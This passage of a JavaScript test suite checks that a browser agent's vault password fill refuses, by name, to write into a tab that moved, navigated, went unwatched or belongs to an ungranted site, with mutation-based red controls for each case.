    const gD = GS.create({ memory: true });
    const lgD = Lm.create({ vault: engD, grants: () => gD, log: () => {}, forYou: { add: () => 'fy-1', resolve() {} } });
    const PW_D = 'B21ccEpoch!' + crypto.randomBytes(4).toString('hex');
    lgD.addOwn({ origin: 'https://shop.example.test', username: 'alice', password: PW_D }, { who: 'owner' });
    lgD.grant('web-login:https://shop.example.test#alice', 'any-account', 'session:conv-b21cc-d');
    let cur = null;
    let leasesNow = [];   // r3159: the leases the conversation still holds (the prune asks the keeper)
    const kcalls = [], inputFns = [], leaseFns = [];
    // the keeper stand-in: EVERY member it is asked for is counted — any call during a note is a read
    const mkKeeperD = ({ road = 'mediated', clock = null } = {}) => new Proxy({
      ...(clock ? { clock } : {}),
      cdpEndpointFor: async () => ({ ok: true, url: fkD.wsUrl }),
      onLease: (fn) => { leaseFns.push(fn); return () => {}; },
      onInput: (fn) => { inputFns.push(fn); return () => {}; },
      saveLoginFenceState() {},
      loginFenceStateOf: () => null,
      loginChannelFor: ({ ephemeral = false, remoteSession = false, action = 'fill' } = {}) => stubLoginChannel({ proxy: road === 'mediated', ephemeral, remoteSession, hasCdp: Boolean(fkD.wsUrl), action }),
      currentTabOf: async () => (typeof cur === 'function' ? cur() : cur),
      leasesFor: () => leasesNow.slice(),
    }, { get(o, p) { const v = o[p]; return typeof v === 'function' ? (...a) => { kcalls.push(String(p)); return v.apply(o, a); } : v; } });
    const T = { profileId: 'bp-b21cc-d', browserKey: 'bk-b21ccd' };
    const SHOP = 'https://shop.example.test/login', OTHER = 'https://other.example.test/account';
    const tidS = fkD.targets()[0].targetId;
    const tidO = fkD.addTarget(OTHER);
    const resetD = () => { fkD.setDom(tidS, { url: SHOP, elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] }); fkD.setDom(tidO, { url: OTHER, elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] }); };
    resetD();
    const REF = (ref = '@e5', name = 'Password') => [{ ref, role: 'textbox', name, nth: 0 }];
    const worldD = async (Dmod, o = {}) => {
      const w = Dmod.create({ keeper: mkKeeperD(o), log: quiet, enableTimeoutMs: 400, holdersOf: () => [{ browserKey: T.browserKey, sessionId: 's-b21cc-d' }], leaseCountOf: () => 1, logins: lgD });
      wsD.push(w);
      await w.arm(T.profileId);
      // both tabs watched (their sessions attached) before a scene: a NAMED note on each; the scenes' own notes replace the slot
      for (const tid of [tidO, tidS]) for (let i = 0; i < 60; i++) { const a = await w.noteSnapshot(T, { parsedRefs: REF('@e0'), targetId: tid }); if (a && a.ok) break; await sleepD(10); }
      return w;
    };
    const valOf = (tid) => (fkD.readDomValues(tid) || {}).pw || '';
    const fillRef = (w, ref = '@e5') => w.fillVaultField(T, { target: ref, spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-b21cc-d'] } });
    const noteNow = async (w, ref = '@e5', name = 'Password') => { await sleepD(3); return w.noteSnapshot(T, { parsedRefs: REF(ref, name), since: Date.now() }); }; // as the route passes it: no tab, the verb's /resolve instant
    const refusedMoved = (r) => !!(r && !r.ok && r.code === 'target_not_found' && /the tab changed since the last snapshot/.test(r.error || '') && /snapshot -i/.test(r.error || ''));
    const MD = mutantCopies('b21cc-epoch', REPO);
    const bdD = fs.readFileSync(path.join(REPO, 'src/server/browser-dialogs.js'), 'utf8');

    // (1) NO READ ON ANY SNAPSHOT — on the mediated road and on the plain one: zero keeper calls, zero browser calls
    const zero = {};
    for (const road of ['mediated', 'plain']) {
      const w = await worldD(Dm, { road });
      await waitD(async () => { const m = fkD.mark(); await sleepD(60); return fkD.mark() === m; }); // the watch quiet first
      await sleepD(3);
      kcalls.length = 0;
      const m0 = fkD.mark();
      const n = await w.noteSnapshot(T, { parsedRefs: REF('@e5'), since: Date.now() });
      zero[road] = { n, keeperCalls: kcalls.slice(), browserCalls: fkD.mark() - m0 };
      if (road === 'mediated') {
        cur = { ok: true, targetId: tidS }; kcalls.length = 0;
        const r = await fillRef(w);
        zero.fill = { ok: !!(r && r.ok), code: r && r.code, error: r && r.error, reads: kcalls.filter((x) => x === 'currentTabOf').length, landed: valOf(tidS) === PW_D && valOf(tidO) === '' };
        resetD();
      }
      w.shutdown();
    }
    ok(!!(zero.mediated.n && zero.mediated.n.ok && zero.mediated.n.pending && zero.mediated.keeperCalls.length === 0 && zero.mediated.browserCalls === 0 && zero.plain.n && zero.plain.n.ok && zero.plain.keeperCalls.length === 0 && zero.plain.browserCalls === 0),
      'B-21cc (r2849 (1)): NO READ ON ANY SNAPSHOT — the note asks the keeper NOTHING (no driver spawn) and the browser NOTHING, on the mediated road and on the plain one; it keeps the snapshot for the fill', zero);
    ok(!!(zero.fill && zero.fill.ok && zero.fill.reads === 1 && zero.fill.landed), 'B-21cc (r2849): the FILL reads the current tab once (its own read, as before) and adopts the kept snapshot there — the value lands in the current tab, none in the other', zero.fill);
    {
      const readSrc = anchored(bdD, '    const slotKey = slotKeyOf(pid, target && target.browserKey);\n', '    const slotKey = slotKeyOf(pid, target && target.browserKey);\n    { const ct = await currentTabFor(w, target, targetId); if (!ct.ok) return { ok: false, count: 0, code: ct.code }; } // 473fa577c: the read on every snapshot\n', 'B-21cc control: the read on the snapshot');
      const w = await worldD(MD.load('src/server/browser-dialogs.js', readSrc, 'note-reads'));
      cur = { ok: true, targetId: tidS }; kcalls.length = 0;
      const n = await noteNow(w);
      const reads = kcalls.filter((x) => x === 'currentTabOf').length;
      w.shutdown();
      ok(reads === 1, 'RED CONTROL (B-21cc r2849 (1)): 473fa577c\'s note — every snapshot asks the keeper for the current tab (one spawn of the driver\'s `tab list`): the zero-read leg above can go red', { reads, n });
    }

    // (2) THE MOVERS, ONE LIST: after each class a fill by reference refuses by name; with none (or the person's OWN window) it lands
    const w2 = await worldD(Dm);
    cur = { ok: true, targetId: tidS };
    const scene = async (label, move) => {
      resetD();
      const n = await noteNow(w2);
      const moved = await move();
      const r = await fillRef(w2);
      const res = { label, noted: !!(n && n.ok), moved, code: r && r.code, error: r && r.error, refused: refusedMoved(r), landed: valOf(tidS) === PW_D, nothing: valOf(tidS) === '' && valOf(tidO) === '' };
      resetD();
      return res;
    };
    const fire = (fns, ev) => { for (const fn of fns) fn(ev); return fns.length > 0; };
    const ctl = await scene('no mover (control)', async () => true);
    const ctlHuman = await scene('the person\'s OWN browsing window letting go (nobody\'s conversation: no mover)', async () => fire(inputFns, { kind: 'handback', human: true, browserKey: T.browserKey, profileId: T.profileId, state: {} }));
    let popup = null;
    const movers = [
      ['the conversation\'s own tab verb on the CLI road (the route\'s /resolve start and /audit end; a failed or closing one too — test-browser-tabs walks the route)', async () => w2.moveTab('tab-verb', { browserKey: T.browserKey }).ok],
      ['the conversation\'s own tab verb on the server\'s tab road (its start and its end — test-browser-tabs)', async () => w2.moveTab('tab-route', { browserKey: T.browserKey }).ok],
      ['a HELPER of the conversation (its child handle) moving a tab — the parent\'s epoch', async () => w2.moveTab('tab-verb', { browserKey: T.browserKey + '.1' }).ok],
      ['a page BORN in the browser (a popup the driver may follow)', async () => { popup = fkD.addTarget('https://shop.example.test/popup'); return waitD(() => fkD.calls().some((c) => c.method === 'Target.attachToTarget' && c.params && c.params.targetId === popup)); }],
      ['a page GONE (the driver\'s tab closed moves it to another)', async () => { const okc = fkD.closeTarget(popup); await sleepD(80); return okc; }],
      ['the person\'s tab act (the live view, browser-stream: its start and its end)', async () => w2.moveTab('person-tab-act', { profileId: T.profileId }).ok],
      ['a TAKEOVER (the keeper\'s input event)', async () => fire(inputFns, { kind: 'takeover', browserKey: T.browserKey, profileId: T.profileId, state: {} })],
      ['a HANDBACK (the keeper\'s input event)', async () => fire(inputFns, { kind: 'handback', browserKey: T.browserKey, profileId: T.profileId, state: {} })],
      ['the watch BLIND (its socket dropped, then watched again)', async () => { const m0 = fkD.mark(); fkD.dropSockets(); await sleepD(60); await w2.arm(T.profileId); const back = await waitD(() => fkD.calls().filter((c) => c.seq > m0 && c.method === 'Page.enable').length >= 2); await sleepD(80); return back; }],
    ];
    const mv = [];
    for (const [label, move] of movers) mv.push(await scene(label, move));
    w2.shutdown();
    ok(ctl.noted && ctl.landed && ctlHuman.noted && ctlHuman.landed, 'B-21cc (r2849 (2)): with NO mover the kept snapshot is adopted and the value lands — the person\'s OWN browsing window (nobody\'s conversation) moves nothing', { ctl, ctlHuman });
    ok(mv.length === 9 && mv.every((x) => x.noted && x.moved === true && x.refused && x.nothing),
      'B-21cc (r2849 (2)): THE MOVERS — after each class (the conversation\'s own tab verbs on both roads, a helper\'s, a page born, a page gone, the person\'s tab act, a takeover, a handback, the watch blind) a fill BY REFERENCE refuses by name and asks for a fresh snapshot; nothing filled anywhere',
      mv.map((x) => ({ label: x.label, noted: x.noted, moved: x.moved, code: x.code, error: x.error, nothing: x.nothing })));
    {
      const noEpoch = anchored(bdD, '    if (s.epoch !== ep0 || ep0 !== ep1 || !s.navSeqs || !s.navSeqs.has(e.targetId)) return { ok: false, why: moved };\n', '    if (!s.navSeqs || !s.navSeqs.has(e.targetId)) return { ok: false, why: moved };\n', 'B-21cc control: the epoch not asked');
      const w = await worldD(MD.load('src/server/browser-dialogs.js', noEpoch, 'no-epoch'));
      cur = { ok: true, targetId: tidS }; resetD();
      await noteNow(w);
      fire(inputFns, { kind: 'handback', browserKey: T.browserKey, profileId: T.profileId, state: {} });
      const r = await fillRef(w);
      const landed = valOf(tidS) === PW_D;
      resetD(); w.shutdown();
      ok(!!(r && r.ok && landed), 'RED CONTROL (B-21cc r2849 (2)): the epoch not asked — after a handback the OLD snapshot is adopted on the read tab (an @ref the agent saw before the move): the movers leg can go red', { r: r && { ok: r.ok, code: r.code } });
    }
    // THE ONE PLACE: every write of the epoch is inside moveTab; every caller of moveTab across src/ is a row of this closed list
    const srcFiles = {};
    for (const rel of fs.readdirSync(path.join(REPO, 'src'), { recursive: true })) { if (String(rel).endsWith('.js')) srcFiles['src/' + rel] = fs.readFileSync(path.join(REPO, 'src', String(rel)), 'utf8'); }
    const moverCensus = (files) => {
      const d = files['src/server/browser-dialogs.js'] || '';
      const a = d.indexOf('  function moveTab('), b = d.indexOf("  /** The epoch a conversation's tab stands at");
      const out = { body: a > 0 && b > a, writesOutside: [], calls: [] };
      for (const [rel, s] of Object.entries(files)) {
        for (const pat of ['tabMoves.byConv.set(', 'tabMoves.byProfile.set(', '++tabMoveSeq', 'tabMoveSeq++', 'tabMoveSeq +=']) { let i = -1; while ((i = s.indexOf(pat, i + 1)) >= 0) if (!(rel === 'src/server/browser-dialogs.js' && i > a && i < b)) out.writesOutside.push(`${rel}: ${pat}`); }
        const re = /moveTab\((?:'([a-z-]+)'|(ev\.kind))/g; let m;
        while ((m = re.exec(s))) out.calls.push(`${rel}: ${m[1] || m[2]}`);
      }
      out.calls.sort();
      return out;
    };
    const MOVER_ROWS = ['src/routes/browser.js: tab-route', 'src/routes/browser.js: tab-route', 'src/routes/browser.js: tab-verb', 'src/routes/browser.js: tab-verb', 'src/server/browser-dialogs.js: ev.kind', 'src/server/browser-dialogs.js: page-born', 'src/server/browser-dialogs.js: page-gone', 'src/server/browser-dialogs.js: watch-down', 'src/server/browser-stream.js: person-tab-act'];
    const mc = moverCensus(srcFiles);
    const dSrc = srcFiles['src/server/browser-dialogs.js'];
    ok(mc.body && mc.writesOutside.length === 0 && JSON.stringify(mc.calls) === JSON.stringify(MOVER_ROWS) && dSrc.includes("const TAB_MOVERS = Object.freeze(['tab-verb', 'tab-route', 'page-born', 'page-gone', 'watch-down', 'person-tab-act', 'takeover', 'handback']);") && dSrc.includes("(ev.kind !== 'takeover' && ev.kind !== 'handback')) return; moveTab(ev.kind,"),
      'B-21cc (r2849 (2)): THE MOVERS ARE A LIST IN ONE PLACE — the epoch is written only inside moveTab, and its callers across src/ are exactly the list (the routes\' tab verbs at start and end on both roads, the watch\'s page born / gone / blind, the keeper\'s takeover and handback, the live view\'s person\'s tab act)', { writesOutside: mc.writesOutside, calls: mc.calls });
    {
      const planted = { ...srcFiles, 'src/server/browser-dialogs.js': anchored(dSrc, '    w.targets.set(tid, e);\n', '    w.targets.set(tid, e); tabMoves.byProfile.set(w.profileId, { seq: ++tabMoveSeq, at: now() });\n', 'B-21cc census control: a bump outside moveTab') };
      const extra = { ...srcFiles, 'src/server/browser-tabs-x.js': "dialogs.moveTab('page-born', { profileId: 'x' });" };
      const p1 = moverCensus(planted), p2 = moverCensus(extra);
      ok(p1.writesOutside.length === 2 && JSON.stringify(p2.calls) !== JSON.stringify(MOVER_ROWS), 'RED CONTROL (r2849 (2)): a bump written outside moveTab, and a caller not on the list, each fail the census above', { p1: p1.writesOutside, p2: p2.calls.length });
    }

    // (3) THE SITE IS JUDGED ON THE TAB THE FILL READS, whatever the slot says
    const w3 = await worldD(Dm);
    resetD(); await noteNow(w3);
    cur = { ok: true, targetId: tidO }; // a mover the hub could not see: the tab read is the other site
    const r3a = await fillRef(w3);
    const a3 = { code: r3a && r3a.code, error: r3a && r3a.error, s: valOf(tidS), o: valOf(tidO) };
    resetD(); await noteNow(w3);
    cur = { ok: true, targetId: tidS }; w3.noteActiveTab(T, tidO); // the watch's own entry names the other
    const r3b = await fillRef(w3);
    const b3 = { ok: !!(r3b && r3b.ok), code: r3b && r3b.code, s: valOf(tidS) === PW_D, o: valOf(tidO) };
    resetD(); w3.shutdown();
    ok(a3.code === 'login_phishing' && /other\.example\.test/.test(a3.error || '') && a3.s === '' && a3.o === '', 'B-21cc (r2849 (3)): THE SITE IS JUDGED ON THE TAB THE FILL READS — the snapshot kept with no tab, the tab read on another site: THAT site\'s grant decides (refused, naming it); nothing of the value reaches either page', a3);
    ok(b3.ok && b3.s && b3.o === '', 'B-21cc (r2849 (3)): …and the tab read on the granted site: the value lands THERE only, though the watch\'s own entry names the other', b3);
    {
      const pickSrc = anchored(bdD, "    const e = pickScopedTabFor(w, target, { targetId: ct.targetId });\n    if (!e || !e.sid) return { ok: false, code: 'target_not_found', error: targetId ?", "    const e = pickScopedTabFor(w, target, { targetId });\n    if (!e || !e.sid) return { ok: false, code: 'target_not_found', error: targetId ?", 'B-21cc control: the fill on the watch\'s entry, not the tab it read');
      const w = await worldD(MD.load('src/server/browser-dialogs.js', pickSrc, 'fill-on-entry'));
      resetD(); await noteNow(w);
      cur = { ok: true, targetId: tidO }; w.noteActiveTab(T, tidS);
      const r = await fillRef(w);
      const reachedS = valOf(tidS) === PW_D;
      resetD(); w.shutdown();
      ok(reachedS, 'RED CONTROL (r2849 (3)): a fill on the watch\'s entry (the release\'s pick) puts the value in a page the conversation is NOT on — the leg above can go red', { r: r && { ok: r.ok, code: r.code } });
    }

    // (4) THE SLOT: references and counts only; one per conversation, replaced by a newer note, gone with the conversation
    const w4 = await worldD(Dm);
    resetD();
    const n4 = await noteNow(w4, '@e7');
    const sl1 = w4.snapshotSlotOf(T);
    const T2 = { profileId: T.profileId, browserKey: 'bk-b21ccd2' };
    await w4.noteSnapshot(T2, { parsedRefs: REF('@e8'), since: Date.now() });
    await noteNow(w4, '@e9');
    const sl2 = w4.snapshotSlotOf(T), sl2b = w4.snapshotSlotOf(T2);
    cur = { ok: true, targetId: tidS };
    const r4 = await fillRef(w4, '@e9');
    const sl3 = w4.snapshotSlotOf(T);
    resetD();
    fire(leaseFns, { kind: 'detach', browserKey: T.browserKey + '.1', profileId: T.profileId }); // a helper's lease ends
    const afterHelper = w4.snapshotSlotOf(T);
    fire(leaseFns, { kind: 'detach', browserKey: T.browserKey, profileId: T.profileId }); // the conversation's own lease ends
    const afterEnd = w4.snapshotSlotOf(T), otherStays = w4.snapshotSlotOf(T2);
    fire(leaseFns, { kind: 'browser-stopped', profileId: T.profileId });
    const afterStop = w4.snapshotSlotOf(T2);
    w4.shutdown();
    const specKeysOk = (sl) => !!(sl && Array.isArray(sl.specs) && sl.specs.length && sl.specs.every((x) => Object.keys(x).sort().join(',') === 'name,nth,ref,role'));
    ok(!!(n4 && n4.ok && sl1 && sl1.keys.join(',') === 'at,epoch,navSeqs,seq,specs,tid,unknown' && specKeysOk(sl1) && sl1.tid === null && Array.isArray(sl1.navSeqs) && sl1.navSeqs.length === 2 && !JSON.stringify(sl1).includes(PW_D) && !/alice|web-login/.test(JSON.stringify(sl1))),
      'B-21cc (r2849 (4)): the slot holds references (ref, role, name, nth — what the note held before) and counts (the epoch, each tab\'s navigations) only: no value, no entry name, no page text beyond the references', sl1);
    ok(!!(sl2 && sl2b && sl2.seq > sl1.seq && sl2.specs[0].ref === '@e9' && sl2b.specs[0].ref === '@e8' && r4 && r4.ok && sl3 && sl3.tid === tidS && sl3.specs === null && sl3.navSeqs === null),
      'B-21cc (r2849 (4)): ONE slot per conversation — a newer note replaces it, another conversation keeps its own; once adopted it keeps only the tab and its number (the counts dropped)', { sl2, sl2b, sl3, r4: r4 && r4.code });
    ok(!!(afterHelper && afterEnd === null && otherStays && afterStop === null), 'B-21cc (r2849 (4)): GONE WITH THE CONVERSATION — its lease\'s end takes its slot (a helper\'s end keeps it; another conversation\'s stays); the browser\'s stop takes every slot', { afterHelper: !!afterHelper, afterEnd, otherStays: !!otherStays, afterStop });
    {
      const keepSrc = anchored(bdD, 'if (ev.browserKey) dropSnapSlots(pid, ev.browserKey); ', '', 'B-21cc control: the slot outlives its conversation');
      const w = await worldD(MD.load('src/server/browser-dialogs.js', keepSrc, 'slot-outlives'));
      await noteNow(w, '@e7');
      fire(leaseFns, { kind: 'detach', browserKey: T.browserKey, profileId: T.profileId });
      const left = w.snapshotSlotOf(T);
      w.shutdown();
      ok(!!left, 'RED CONTROL (r2849 (4)): a slot not dropped at the lease\'s end outlives its conversation — the leg above can go red', { left: !!left });
    }

    // the MOMENT and the SAME DOCUMENT: a mover after the verb's own /resolve instant, or an unknown instant, keeps the tab unknown;
    // an older snapshot is never used once a newer one came (the second reader's same-document case: agent-browser renumbers @eN)
    const w6 = await worldD(Dm);
    cur = { ok: true, targetId: tidS }; resetD();
    await sleepD(3); w6.moveTab('tab-verb', { browserKey: T.browserKey });
    const nLate = await w6.noteSnapshot(T, { parsedRefs: REF('@e5'), since: Date.now() - 1000 }); // the mover came after the verb's /resolve
    const rLate = await fillRef(w6);
    const nZero = await w6.noteSnapshot(T, { parsedRefs: REF('@e5'), since: 0 });
    const rZero = await fillRef(w6);
    resetD();
    await noteNow(w6, '@e2'); const rA = await fillRef(w6, '@e2'); const landedA = valOf(tidS) === PW_D; resetD();
    await w6.noteSnapshot(T, { parsedRefs: REF('@e2', 'Email'), since: 0 }); const rB = await fillRef(w6, '@e2');
    const nothingB = valOf(tidS) === '' && valOf(tidO) === '';
    resetD(); w6.shutdown();
    ok(!!(nLate && nLate.code === 'tab_moved' && refusedMoved(rLate) && nZero && nZero.code === 'tab_moved' && refusedMoved(rZero)), 'B-21cc (r2849): a mover AFTER the snapshot verb\'s own /resolve instant, or no instant at all, keeps the snapshot\'s tab UNKNOWN — a fill by reference refuses by name', { nLate, rLate: rLate && rLate.error, nZero, rZero: rZero && rZero.error });
    ok(!!(rA && rA.ok && landedA && refusedMoved(rB) && nothingB), 'B-21cc (r2849): the SAME DOCUMENT — an older snapshot adopted on the tab is NEVER used once a newer note came whose tab is unknown (agent-browser renumbers @eN): refused by name, nothing filled', { rA: rA && rA.code, rB: rB && rB.error });
    {
      const noMoment = anchored(bdD, '    if (hasSince && (!since || ep.at >= since)) {\n', '    if (hasSince && !since) {\n', 'B-21cc control: the moment not asked');
      const w = await worldD(MD.load('src/server/browser-dialogs.js', noMoment, 'no-moment'));
      cur = { ok: true, targetId: tidS }; resetD();
      await sleepD(3); w.moveTab('tab-verb', { browserKey: T.browserKey });
      await w.noteSnapshot(T, { parsedRefs: REF('@e5'), since: Date.now() - 1000 });
      const r = await fillRef(w); const landed = valOf(tidS) === PW_D;
      resetD(); w.shutdown();
      ok(!!(r && r.ok && landed), 'RED CONTROL (r2849): the moment not asked — a snapshot taken BEFORE a mover is adopted on the tab after it: the moment leg can go red', { r: r && r.code });
      const older = anchored(bdD, "    if (s.unknown) return { ok: false, why: s.unknown === 'blackout' ? '— VibeSpace was not watching this browser when that snapshot was taken' : moved }; // r3159 (3): the true reason\n", '    if (s.unknown) return { ok: true, refs: e.snapshotRefs };\n', 'B-21cc control: the older snapshot used');
      const w7 = await worldD(MD.load('src/server/browser-dialogs.js', older, 'older-snapshot'));
      resetD(); await noteNow(w7, '@e2'); await fillRef(w7, '@e2'); resetD();
      await w7.noteSnapshot(T, { parsedRefs: REF('@e2', 'Email'), since: 0 }); const r7 = await fillRef(w7, '@e2'); const landed7 = valOf(tidS) === PW_D;
      resetD(); w7.shutdown();
      ok(!!(r7 && r7.ok && landed7), 'RED CONTROL (r2849): the older snapshot used — the newer note\'s @e2 (another field) is filled by the OLDER snapshot\'s @e2: the same-document leg can go red', { r7: r7 && r7.code });
    }

    // ── r2992 (round ww38os4bk): THE REFERENCES KEPT HONEST — the wrong field on the right site (the site judgement keeps the value safe) ──
    // (1) A BLACKOUT: a snapshot the watch could not see makes the slot UNKNOWN — never the older snapshot a stash restores on its tab
    const blackout = async (Dmod) => {
      const w = await worldD(Dmod);
      cur = { ok: true, targetId: tidS }; resetD();
      await noteNow(w, '@e2');
      const rA = await fillRef(w, '@e2'); const landedA = valOf(tidS) === PW_D; resetD(); // A adopted on S
      const m0 = fkD.mark();
      fkD.dropSockets(); await sleepD(120);
      const nB = await w.noteSnapshot(T, { parsedRefs: REF('@e2', 'Email'), since: Date.now() }); // B, renumbered, while the watch is down
      await w.arm(T.profileId);
      await waitD(() => fkD.calls().filter((c) => c.seq > m0 && c.method === 'Page.enable').length >= 2); await sleepD(120);
      const rB = await fillRef(w, '@e2');
      const res = { rA: !!(rA && rA.ok), landedA, nB, rB: rB && { ok: rB.ok, code: rB.code, error: rB.error }, landedB: valOf(tidS) === PW_D, nothingB: valOf(tidS) === '' && valOf(tidO) === '' };
      resetD(); w.shutdown();
      return res;
    };
    const bo = await blackout(Dm);
    ok(bo.rA && bo.landedA && bo.nB && bo.nB.code === 'not_watched' && !!(bo.rB && !bo.rB.ok && bo.rB.code === 'target_not_found' && /VibeSpace was not watching this browser when that snapshot was taken/.test(bo.rB.error || '') && /snapshot -i/.test(bo.rB.error || '')) && bo.nothingB, 'B-21cc (r2992 (1), r3159 (3)): A BLACKOUT — a snapshot taken while the watch is not open makes the slot UNKNOWN, so the fill by reference after the watch returns refuses by name with the TRUE reason (VibeSpace was not watching the browser then; take a new snapshot); the OLDER snapshot the stash restored on the tab is never used', bo);
    {
      const boSrc = anchored(bdD, "    if (!w || w.state !== 'open') { if (pid) snapSlots.set(slotKeyOf(pid, target && target.browserKey), { seq: ++snapSeq, at: now(), tid: null, epoch: null, navSeqs: null, specs: null, unknown: 'blackout' }); return { ok: false, count: 0, code: 'not_watched' }; }", "    if (!w || w.state !== 'open') return { ok: false, count: 0 };", 'B-21cc control: a note in a blackout leaves the slot as it was');
      const boR = await blackout(MD.load('src/server/browser-dialogs.js', boSrc, 'blackout-keeps-slot'));
      ok(boR.landedB, 'RED CONTROL (r2992 (1)): a note in a blackout that leaves the slot as it was — the stash restores the OLDER snapshot and the newer @e2 fills the older one\'s field: the leg above can go red', { rB: boR.rB });
    }
    // (2) ONE SLOT PER DRIVER: a helper (its own driver on its own tab) keeps its snapshot under ITS key — the parent never adopts it
    const helperScene = async (Dmod) => {
      const w = await worldD(Dmod);
      cur = { ok: true, targetId: tidS }; resetD();
      const TH = { profileId: T.profileId, browserKey: T.browserKey + '.1' };
      await sleepD(3);
      const nH = await w.noteSnapshot(TH, { parsedRefs: REF('@e5'), since: Date.now() });
      const rP = await fillRef(w, '@e5'); // the PARENT fills by a reference its own driver's snapshot never showed
      const res = { nH, rP: rP && { ok: rP.ok, code: rP.code, error: rP.error }, landed: valOf(tidS) === PW_D, nothing: valOf(tidS) === '' && valOf(tidO) === '', own: w.snapshotSlotOf(TH), parent: w.snapshotSlotOf(T) };
      resetD(); w.shutdown();
      return res;
    };
    const hs = await helperScene(Dm);
    ok(!!(hs.nH && hs.nH.ok && hs.rP && !hs.rP.ok && hs.rP.code === 'target_not_found' && hs.nothing && hs.own && hs.own.specs && hs.own.specs[0].ref === '@e5' && hs.parent && hs.parent.tid === tidS),
      'B-21cc (r2992 (2)): ONE SLOT PER DRIVER — a helper\'s snapshot is kept under the helper\'s own key; the parent\'s fill by that reference never adopts it (refused by name, nothing filled)', { rP: hs.rP, own: hs.own && hs.own.seq, parent: hs.parent && hs.parent.tid });
    {
      const keySrc = anchored(bdD, "const slotKeyOf = (profileId, browserKey) => `${String(profileId || '')}\\0${String(browserKey || '') || '*'}`;", "const slotKeyOf = (profileId, browserKey) => `${String(profileId || '')}\\0${parentKey(browserKey) || '*'}`;", 'B-21cc control: one slot per parent conversation'); // stale-pins: kept — the older line, planted back as this RED control
      const hsR = await helperScene(MD.load('src/server/browser-dialogs.js', keySrc, 'slot-per-parent'));
      ok(hsR.landed, 'RED CONTROL (r2992 (2)): a slot per PARENT — the parent\'s fill adopts the helper\'s snapshot and fills its field: the leg above can go red', { rP: hsR.rP });
    }
    // (3) THE COUNT THE SNAPSHOT RAN UNDER: a page that navigated between the snapshot's /resolve and its note is unknown, never «as after»
    const navScene = async (Dmod) => {
      const w = await worldD(Dmod);
      cur = { ok: true, targetId: tidS };
      const since0 = Date.now(); await sleepD(5);
      fkD.navigate(tidS, SHOP + '?step=2');
      fkD.setDom(tidS, { url: SHOP + '?step=2', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
      await sleepD(150);
      const nN = await w.noteSnapshot(T, { parsedRefs: REF('@e5'), since: since0 }); // the snapshot ran BEFORE the navigation, its note came after
      const rN = await fillRef(w, '@e5');
      const res = { nN, rN: rN && { ok: rN.ok, code: rN.code, error: rN.error }, landed: valOf(tidS) === PW_D, nothing: valOf(tidS) === '' && valOf(tidO) === '' };
      fkD.navigate(tidS, SHOP); await sleepD(80); resetD(); w.shutdown();
      return res;
    };
    const ns3 = await navScene(Dm);
    ok(!!(ns3.nN && ns3.nN.ok && ns3.rN && !ns3.rN.ok && ns3.rN.code === 'target_not_found' && /navigated/.test(ns3.rN.error || '') && ns3.nothing),
      'B-21cc (r2992 (3)): THE COUNT THE SNAPSHOT RAN UNDER — a page that navigated at or after the snapshot verb\'s /resolve instant is recorded unknown at the note; the fill there refuses by name (navigated), nothing filled', ns3);
    {
      const navSrc = anchored(bdD, '    for (const x of w.targets.values()) if (inScope(scope, x.targetId) && x.sid) navSeqs.set(x.targetId, hasSince && (Number(x.navAt) || 0) >= since ? -1 : (x.navSeq || 0));', '    for (const x of w.targets.values()) if (inScope(scope, x.targetId) && x.sid) navSeqs.set(x.targetId, x.navSeq || 0);', 'B-21cc control: the count taken at the note'); // stale-pins: kept — the older line, planted back as this RED control
      const nsR = await navScene(MD.load('src/server/browser-dialogs.js', navSrc, 'count-at-note'));
      ok(nsR.landed, 'RED CONTROL (r2992 (3)): the count taken at the NOTE — the old document\'s reference passes on the new document and is filled: the leg above can go red', { rN: nsR.rN });
    }
    // (4) THE MOVES' TWO MAPS PRUNED where the slots are dropped
    const pruneScene = async (Dmod) => {
      const w = await worldD(Dmod);
      w.moveTab('tab-verb', { browserKey: T.browserKey }); w.moveTab('page-born', { profileId: T.profileId });
      const before = w.tabMovesOf();
      fire(leaseFns, { kind: 'detach', browserKey: T.browserKey + '.1', profileId: T.profileId });
      const afterHelper = w.tabMovesOf();
      leasesNow = [];   // the conversation's own lease ends and it holds no other: its entry may go
      fire(leaseFns, { kind: 'detach', browserKey: T.browserKey, profileId: T.profileId });
      const afterEnd = w.tabMovesOf();
      fire(leaseFns, { kind: 'browser-stopped', profileId: T.profileId });
      const afterStop = w.tabMovesOf();
      w.shutdown();
      return { before, afterHelper, afterEnd, afterStop };
    };
    const pr = await pruneScene(Dm);
    ok(pr.before.conversations.includes(T.browserKey) && pr.before.browsers.includes(T.profileId) && pr.afterHelper.conversations.includes(T.browserKey) && !pr.afterEnd.conversations.includes(T.browserKey) && pr.afterEnd.browsers.includes(T.profileId) && pr.afterStop.browsers.includes(T.profileId),
      'B-21cc (r2992 (4), r3159 (1)): THE MOVES\' MAPS — the conversation\'s entry goes when it holds NO lease on any browser (a helper\'s end keeps it); the browser\'s own mover STAYS at its stop (a stop is a mover a later note is judged against)', pr);
    // r3159 (1a): a conversation that still holds a lease on ANOTHER browser — that other lease's end never forgets ITS mover: a snapshot
    // whose verb was in flight when its own tab act moved the tab stays unknown, never adopted on the moved tab
    const pruneLive = async (Dmod) => {
      const w = await worldD(Dmod);
      cur = { ok: true, targetId: tidS }; resetD();
      leasesNow = [{ profileId: T.profileId, browserKey: T.browserKey }];   // it still holds THIS browser
      const since0 = Date.now(); await sleepD(3);
      w.moveTab('tab-verb', { browserKey: T.browserKey });   // its own tab act moves the tab while the snapshot's verb is in flight
      fire(leaseFns, { kind: 'detach', browserKey: T.browserKey, profileId: 'bp-b21cc-other' });   // the OTHER browser's lease ends
      const n = await w.noteSnapshot(T, { parsedRefs: REF('@e5'), since: since0 });
      const r = await fillRef(w, '@e5');
      const res = { n, r: r && { ok: r.ok, code: r.code, error: r.error }, landed: valOf(tidS) === PW_D, nothing: valOf(tidS) === '' && valOf(tidO) === '', kept: w.tabMovesOf().conversations.includes(T.browserKey) };
      resetD(); w.shutdown(); leasesNow = [];
      return res;
    };
    const pl = await pruneLive(Dm);
    ok(!!(pl.kept && pl.n && pl.n.code === 'tab_moved' && refusedMoved(pl.r) && pl.nothing), 'B-21cc (r3159 (1a)): another browser\'s lease ending keeps the conversation\'s moves entry while it holds a lease here — the snapshot in flight across its own tab act stays UNKNOWN and the fill refuses by name', pl);
    {
